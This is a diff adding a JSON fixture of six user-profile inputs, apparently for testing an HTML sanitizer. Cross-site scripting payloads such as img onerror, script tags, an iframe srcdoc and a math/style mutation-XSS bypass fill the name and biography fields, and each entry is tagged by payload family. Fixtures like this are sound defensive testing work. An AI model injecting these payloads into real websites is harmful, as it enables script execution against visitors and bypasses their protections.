@@ -1,0 +1,49 @@
+[
+ {
+  "hex": "0100",
+  "arguments": "{'user_name': '<img src=x onerror=alert(1)>', 'biography': 'Software engineer from xyz.', 'status': 'Feeling great!'}",
+  "family": [
+   "event_handler_element"
+  ]
+ },
+ {
+  "hex": "ffff",
+  "arguments": "{'user_name': '<script>alert(1)</script>', 'biography': 'Software engineer from xyz.', 'status': 'Feeling great!'}",
+  "family": [
+   "script_element"
+  ]
+ },
+ {
+  "hex": "01e6",
+  "arguments": "{'user_name': '<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=x onerror=alert(1)>\"></math>', 'biography': 'Software engineer from xyz.', 'status': 'Feeling great!'}",
+  "family": [
+   "event_handler_element",
+   "other_active_elements"
+  ]
+ },
+ {
+  "hex": "0101fe",
+  "arguments": "{'user_name': '<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>', 'biography': 'Software engineer from xyz.', 'status': 'Feeling great!'}",
+  "family": [
+   "other_active_elements",
+   "script_element"
+  ]
+ },
+ {
+  "hex": "01000001ff7a",
+  "arguments": "{'user_name': '<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>', 'biography': '<img src=x onerror=alert(1)>', 'status': 'Feeling great!'}",
+  "family": [
+   "event_handler_element",
+   "other_active_elements",
+   "script_element"
+  ]
+ },
+ {
+  "hex": "530000cdfffffff8",
+  "arguments": "{'user_name': '<img src=x onerror=alert(1)>', 'biography': \"</div><script>alert('xss')</script>\", 'status': 'Feeling great!'}",
+  "family": [
+   "event_handler_element",
+   "script_element"
+  ]
+ }
+]
